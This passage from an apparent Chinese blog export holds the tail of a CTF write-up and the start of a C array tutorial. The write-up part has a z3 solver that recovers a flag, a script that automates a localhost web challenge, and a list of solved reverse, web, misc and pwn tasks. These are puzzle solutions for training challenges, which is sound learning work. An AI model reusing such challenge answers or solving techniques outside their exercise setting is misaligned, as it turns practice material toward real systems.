<span class="number">28</span> * x13 + <span class="number">280</span> * x11 + <span class="number">118</span> * x10 + <span class="number">58</span> * x9 + <span class="number">50</span> * x8 + <span class="number">155</span> * x7 + <span class="number">161</span> * x6 + <span class="number">64</span> * x5 + <span class="number">303</span> * x4 + <span class="number">76</span> * x3 + <span class="number">43</span> * x2 + <span class="number">109</span> * x1 + <span class="number">102</span> * x0 + <span class="number">93</span> * x30 == <span class="number">497492</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">89</span> * x29 + <span class="number">148</span> * x28 + <span class="number">82</span> * x27 + <span class="number">53</span> * x26 + <span class="number">274</span> * x25 + <span class="number">220</span> * x24 + <span class="number">202</span> * x23 + <span class="number">123</span> * x22 + <span class="number">231</span> * x21 + <span class="number">169</span> * x20 + <span class="number">278</span> * x19 + <span class="number">259</span> * x18 + <span class="number">208</span> * x17 + <span class="number">219</span> * x16 + <span class="number">371</span> * x15 + <span class="number">181</span> * x12 + <span class="number">104</span> * x11 + <span class="number">392</span> * x10 + <span class="number">285</span> * x9 + <span class="number">113</span> * x8 + <span class="number">298</span> * x7 + <span class="number">389</span> * x6 + <span class="number">322</span> * x5 + <span class="number">338</span> * x4 + <span class="number">237</span> * x3 + <span class="number">234</span> * x0 + <span class="number">261</span> * x1 + <span class="number">10</span> * x2 + <span class="number">345</span> * x13 + <span class="number">3</span> * x14 + <span class="number">361</span> * x30 == <span class="number">659149</span>)</span><br><span class="line">solver.add(</span><br><span class="line">    <span class="number">361</span> * x29 + <span class="number">359</span> * x28 + <span class="number">93</span> * x27 + <span class="number">315</span> * x26 + <span class="number">69</span> * x25 + <span class="number">137</span> * x24 + <span class="number">69</span> * x23 + <span class="number">58</span> * x22 + <span class="number">300</span> * x21 + <span class="number">371</span> * x20 + <span class="number">264</span> * x19 + <span class="number">317</span> * x18 + <span class="number">215</span> * x17 + <span class="number">155</span> * x16 + <span class="number">215</span> * x15 + <span class="number">330</span> * x14 + <span class="number">239</span> * x13 + <span class="number">212</span> * x12 + <span class="number">88</span> * x11 + <span class="number">82</span> * x10 + <span class="number">354</span> * x9 + <span class="number">85</span> * x8 + <span class="number">310</span> * x7 + <span class="number">84</span> * x6 + <span class="number">374</span> * x5 + <span class="number">380</span> * x4 + <span class="number">215</span> * x3 + <span class="number">351</span> * x2 + <span class="number">141</span> * x1 + <span class="number">115</span> * x0 + <span class="number">108</span> * x30 == <span class="number">629123</span>)</span><br><span class="line"></span><br><span class="line">print(solver.check())</span><br><span class="line">print(solver.model())</span><br><span class="line"></span><br><span class="line"># x29 = <span class="number">33</span>,</span><br><span class="line">#  x18 = <span class="number">69</span>,</span><br><span class="line">#  x22 = <span class="number">116</span>,</span><br><span class="line">#  x0 = <span class="number">109</span>,</span><br><span class="line">#  x3 = <span class="number">99</span>,</span><br><span class="line">#  x7 = <span class="number">121</span>,</span><br><span class="line">#  x23 = <span class="number">105</span>,</span><br><span class="line">#  x11 = <span class="number">115</span>,</span><br><span class="line">#  x30 = <span class="number">125</span>,</span><br><span class="line">#  x13 = <span class="number">108</span>,</span><br><span class="line">#  x20 = <span class="number">117</span>,</span><br><span class="line">#  x1 = <span class="number">111</span>,</span><br><span class="line">#  x10 = <span class="number">95</span>,</span><br><span class="line">#  x16 = <span class="number">100</span>,</span><br><span class="line">#  x25 = <span class="number">110</span>,</span><br><span class="line">#  x21 = <span class="number">97</span>,</span><br><span class="line">#  x26 = <span class="number">115</span>,</span><br><span class="line">#  x6 = <span class="number">123</span>,</span><br><span class="line">#  x2 = <span class="number">101</span>,</span><br><span class="line">#  x12 = <span class="number">48</span>,</span><br><span class="line">#  x19 = <span class="number">113</span>,</span><br><span class="line">#  x24 = <span class="number">48</span>,</span><br><span class="line">#  x9 = <span class="number">117</span>,</span><br><span class="line">#  x4 = <span class="number">116</span>,</span><br><span class="line">#  x5 = <span class="number">102</span>,</span><br><span class="line">#  x17 = <span class="number">95</span>,</span><br><span class="line">#  x8 = <span class="number">48</span>,</span><br><span class="line">#  x14 = <span class="number">118</span>,</span><br><span class="line">#  x28 = <span class="number">33</span>,</span><br><span class="line">#  x27 = <span class="number">33</span>,</span><br><span class="line">#  x15 = <span class="number">51</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;x29&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x18&#x27;</span>: <span class="number">69</span>,</span><br><span class="line">    <span class="string">&#x27;x22&#x27;</span>: <span class="number">116</span>,</span><br><span class="line">    <span class="string">&#x27;x0&#x27;</span>: <span class="number">109</span>,</span><br><span class="line">    <span class="string">&#x27;x3&#x27;</span>: <span class="number">99</span>,</span><br><span class="line">    <span class="string">&#x27;x7&#x27;</span>: <span class="number">121</span>,</span><br><span class="line">    <span class="string">&#x27;x23&#x27;</span>: <span class="number">105</span>,</span><br><span class="line">    <span class="string">&#x27;x11&#x27;</span>: <span class="number">115</span>,</span><br><span class="line">    <span class="string">&#x27;x30&#x27;</span>: <span class="number">125</span>,</span><br><span class="line">    <span class="string">&#x27;x13&#x27;</span>: <span class="number">108</span>,</span><br><span class="line">    <span class="string">&#x27;x20&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">    <span class="string">&#x27;x1&#x27;</span>: <span class="number">111</span>,</span><br><span class="line">    <span class="string">&#x27;x10&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">    <span class="string">&#x27;x16&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;x25&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">    <span class="string">&#x27;x21&#x27;</span>: <span class="number">97</span>,</span><br><span class="line">    <span class="string">&#x27;x26&#x27;</span>: <span class="number">115</span>,</span><br><span class="line">    <span class="string">&#x27;x6&#x27;</span>: <span class="number">123</span>,</span><br><span class="line">    <span class="string">&#x27;x2&#x27;</span>: <span class="number">101</span>,</span><br><span class="line">    <span class="string">&#x27;x12&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x19&#x27;</span>: <span class="number">113</span>,</span><br><span class="line">    <span class="string">&#x27;x24&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x9&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">    <span class="string">&#x27;x4&#x27;</span>: <span class="number">116</span>,</span><br><span class="line">    <span class="string">&#x27;x5&#x27;</span>: <span class="number">102</span>,</span><br><span class="line">    <span class="string">&#x27;x17&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">    <span class="string">&#x27;x8&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">    <span class="string">&#x27;x14&#x27;</span>: <span class="number">118</span>,</span><br><span class="line">    <span class="string">&#x27;x28&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x27&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="string">&#x27;x15&#x27;</span>: <span class="number">51</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># # 按照 x 后的数字进行排序</span><br><span class="line"># sorted_data = sorted(data.items(), key=lambda item: <span class="type">int</span>(item[<span class="number">0</span>][<span class="number">1</span>:]))</span><br><span class="line">#</span><br><span class="line"># # 重组数据</span><br><span class="line"><span class="meta"># result = <span class="string">&#x27;&#x27;.join(chr(value) for key, value in sorted_data)</span></span></span><br><span class="line"><span class="string"><span class="meta">#</span></span></span><br><span class="line"><span class="string"><span class="meta"># print(result)</span></span></span><br></pre></td></tr></table></figure><h1 id="web">Web</h1><h2 id="gas-gas-gas">gas!gas!gas!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gas gas gas</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;driver&#x27;</span>: <span class="string">&#x27;wahaha&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;steering_control&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,  <span class="comment"># 直行0,左转-1,右转1</span></span><br><span class="line">    <span class="string">&#x27;throttle&#x27;</span>: <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 松开0,保持1,全开2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text_list = []</span><br><span class="line"><span class="comment"># r = requests.post(url=&#x27;http://localhost:6664/&#x27;, data=data)</span></span><br><span class="line"><span class="comment"># cookie = r.cookies.get_dict()</span></span><br><span class="line"><span class="comment"># print(cookie)</span></span><br><span class="line">cookie = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">times = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前设置:&#x27;</span> + <span class="string">&#x27;方向:&#x27;</span> + data[<span class="string">&#x27;steering_control&#x27;</span>] + <span class="string">&#x27;,油门&#x27;</span> + data[<span class="string">&#x27;throttle&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> cookie == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">&#x27;http://localhost:6664/&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.post(url=<span class="string">&#x27;http://localhost:6664/&#x27;</span>, data=data, cookies=cookie)</span><br><span class="line">    cookie = r.cookies.get_dict()</span><br><span class="line">    <span class="comment"># print(&#x27;cookie&#x27;,cookie)</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;cookie: &#x27;</span>, cookie)</span><br><span class="line">    pattern_text = re.<span class="built_in">compile</span>(<span class="string">&#x27;&gt;弯道(.*?)&lt;&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_text, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提示:弯道反向打方向盘</span></span><br><span class="line">    <span class="comment"># 弯道</span></span><br><span class="line">    pattern_right = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道向右&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_right, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;-1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_left = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道向左&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_left, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_right = re.<span class="built_in">compile</span>(<span class="string">&#x27;弯道直行&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_right, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        data[<span class="string">&#x27;steering_control&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提示:抓地力小,减小油门</span></span><br><span class="line">    <span class="comment"># 油门</span></span><br><span class="line">    pattern_gas_keep = re.<span class="built_in">compile</span>(<span class="string">&#x27;保持这个速度&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_keep, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_gas_belower = re.<span class="built_in">compile</span>(<span class="string">&#x27;抓地力太小了&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_belower, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    pattern_gas_behigher = re.<span class="built_in">compile</span>(<span class="string">&#x27;抓地力太大了&#x27;</span>)</span><br><span class="line">    result = re.search(pattern_gas_behigher, r.text)</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">None</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line">        data[<span class="string">&#x27;throttle&#x27;</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=============================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    text_list.append(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="built_in">print</span>(text_list[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================================&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="解出的题目记录">解出的题目记录</h1><p>回头看的时候有个记录…</p><h2 id="reverse">Reverse</h2><p>base_64,UPX!,Xor,ANDROID,RRRRRc4,SMC,EQUATION,junk_code</p><h2 id="web">Web</h2><p>http,彼岸的flag,cookie,gas!gas!gas!,大海捞针</p><h2 id="misc">Misc</h2><p>打不开的图片2,狗子(1)普通的猫</p><h2 id="pwn">PWN</h2><p>test_nc,baby_calculator,fd,int_overflow,ret2text_32,ret2text_64,shellcode_level0,shellcode_level1(这题貌似没通?但是文件夹里有个exp?)</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-10-数组</title>
      <link href="/2023-10-20-b7fda0df05ff/"/>
      <url>/2023-10-20-b7fda0df05ff/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是数组">什么是数组</h1><p>数据往往不是各不相关的,我们需要处理的数据往往是一系列大量的相同类型的值,有着完全相同行为和作用.</p><p>例如一个班级的所有学生的各个学号,它们都是一个个固定长度的正整数,均用于唯一识别一名学生;</p><p>再例如一家超市的所有商品名,它们都是一个个的字符串.</p><p>对于这些同类型的,并且往往是大量的数据,我们显然不能像过去那样分别声明一个个单独的变量去存储:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> stu1=<span class="number">10001</span>;</span><br><span class="line">    <span class="type">int</span> stu2=<span class="number">10002</span>;</span><br><span class="line">    <span class="type">int</span> stu3=<span class="number">10003</span>;</span><br><span class="line">    <span class="type">int</span> stu4=<span class="number">10004</span>;</span><br><span class="line">    <span class="type">int</span> stu5=<span class="number">10006</span>;</span><br><span class="line">    <span class="type">int</span> stu6=<span class="number">10007</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,这样的存储非常繁琐,并且限制非常大,各个变量都是互相独立的(尽管他们的变量名都相似),如果我们重新编排学号,例如从100开头变为200开头,我们只能一个个的去设置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> stu1=<span class="number">10001</span>;</span><br><span class="line">    <span class="type">int</span> stu2=<span class="number">10002</span>;</span><br><span class="line">    <span class="type">int</span> stu3=<span class="number">10003</span>;</span><br><span class="line">    <span class="type">int</span> stu4=<span class="number">10004</span>;</span><br><span class="line">    <span class="type">int</span> stu5=<span class="number">10006</span>;</span><br><span class="line">    <span class="type">int</span> stu6=<span class="number">10007</span>;</span><br><span class="line">    </span><br><span class="line">    stu1 = <span class="number">20001</span>;</span><br><span class="line">    stu2 = <span class="number">20002</span>;</span><br><span class="line">    stu3 = <span class="number">20003</span>;</span><br><span class="line">    stu4 = <span class="number">20004</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样显然不现实,幸运的是,高级语言提供了各种用于存储这种一系列值的功能.</p><p>C语言中使用<code>数组</code>来存储大量的相同类型的值,我们可以在声明数组的时候设置其长度,即可以存储的具体数量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> students[<span class="number">6</span>] = &#123;</span><br><span class="line">            <span class="number">10001</span>, <span class="number">10002</span>, <span class="number">10003</span>, <span class="number">10004</span>, <span class="number">10006</span>, <span class="number">10007</span></span><br><span class="line">    &#125;; <span class="comment">// 声明并初始化一个数组用于存储各个学号,数组的长度为6,代表最多可以存储6个学号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        students[i] = <span class="number">20000</span> + i + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="comment">// 使用循环&quot;遍历&quot;数组中的每个&quot;元素&quot;,并对其进行修改,注意元素&quot;下标&quot;从0到5而不是从1到6</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, students[i]);</span><br><span class="line">    &#125; <span class="comment">// 同样使用循环来遍历数组中的每个元素,只不过这次我们对其输出而不是修改值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="c语言的数组">C语言的数组</h1><p>事实上,数组是线性分配的,也就是说,一个数组的每个元素在内存中是紧挨着的存储(分配)的.</p><p>例如一个长度为10的int数组,一共占用4x10个,也就是40个字节,其中4为一个int变量占用的空间.</p><p>下面介绍数组的最基本的内容.</p><h2 id="已知常量大小数组">已知常量大小数组</h2><p>C语言中一般的数组<code>(已知常量大小数组)</code>的声明语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素类型&gt; &lt;数组名&gt;[数组长度];</span><br></pre></td></tr></table></figure><ol><li><p>元素类型</p><p>可以是任意基本类型,例如<code>int</code>,<code>double</code>,<code>char</code>等</p><p>也可以是像结构体这样的自定义类型</p><p>元素类型指定了整个数组的每一个元素的类型</p></li><li><p>数组名</p><p>数组名一样也是标识符,同样要遵循标识符的命名规范,和单个变量一样,数组名唯一标识了整个数组</p></li><li><p>数组长度</p><p>数组长度必须是<code>整数常量表达式</code>,说简单点,必须是能直接算出来的常数,而且必须是整数</p><p>例如<code>2*3</code>,<code>100</code>这些都是允许的,反之,<code>2*i</code>这样的表达式就是不允许的(但不是绝对,后面提到的VLA就允许)</p></li></ol><p>对数组元素进行访问十分简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;数组名&gt;[下标]</span><br></pre></td></tr></table></figure><p>C语言中(所有的编程语言)数组的下标都是从0开始的,这种设计十分合理,读者自行百度了解</p><p>我们要访问数组a的第1个元素,则它的下标(也就是编号)就是0,我们要访问它,只需要<code>a[0]</code>即可</p><p>例如,我可以定义长度为10的int数组来存1~10这10个数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//定义长度为10的int数组来存1~10这10个数</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        a[i] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]); <span class="comment">// 获取数组中的每一个值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024141939496.png" alt="image-20231024141939496" style="zoom:50%;" /><p>上面这种使用循环变量对数组进行逐个的访问的方法叫做<code>遍历</code>,顾名思义,就是一个一个有序地对数组这个序列进行访问,我们可以在遍历时仅仅获取它们的值,或者可以对它们进行修改.</p><h2 id="对数组进行初始化">对数组进行初始化</h2><p>在上一节的例子中,我们使用循环对数组的每一个元素进行了赋值.</p><p>我们也可以在声明时就使用一些特定的值对数组进行<code>初始化</code>,这里涉及到<code>初始化器</code>这个概念,具体可以自行百度了解.</p><h3 id="初始化列表">初始化列表</h3><p>我们在声明时对数组的各个元素进行初始化,可以使用<code>初始化列表</code>来实现,语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素类型&gt; &lt;数组名&gt;[数组长度] = &#123;表达式,...&#125;;</span><br></pre></td></tr></table></figure><p>可以看到,除了原先的声明,我们在<code>[]</code>后面紧跟一个<code>=&#123;&#125;</code>,其中包含有若干以<code>,</code>分隔的表达式,这些表达式的值用于对数组的每个元素依次进行赋值.</p><p>例如,我们上面的例子可以改写为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//定义长度为10的int数组来存1~10这10个数</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果不变.</p><p>注意:</p><ol><li><p><code>&#123;&#125;初始化列表</code>中的表达式个数不能多于数组元素的个数(数组长度),它们是一一对应来赋值的</p></li><li><p>如果表达式个数少于数组元素的个数,则后面的值被填充为整型的0或浮点型的+0</p><p>需要注意的是,自C23起,C语言才支持了使用<code>=&#123;&#125;</code>这样的<code>空初始化器</code>来达成与 C++ 中的<a href="https://zh.cppreference.com/w/cpp/language/value_initialization">值初始化</a>相同的语义</p></li><li><p>特别常用于int数组,我们可以使用<code>=&#123;0&#125;</code>来用0填充整个数组,不过,对于浮点型,个人建议还是不要依赖这种填充</p></li><li><p>如果没有对数组进行初始化,那么数组的各个元素将会是垃圾值,我们必须对其赋初值后才能&quot;使用&quot;它们.</p><p>注意:放在全局变量的数组和普通变量一样,会用0去填充,而不是垃圾值</p></li></ol><h3 id="指定初始化器">指定初始化器</h3><p>C99新增了一个<code>指定初始化器</code>的特性,这让我们可以初始化指定的数组元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//C99新增了一个`指定初始化器`的特性,这让我们可以初始化指定的数组元素</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;[<span class="number">2</span>] = <span class="number">1</span>, [<span class="number">5</span>] = <span class="number">2</span>, <span 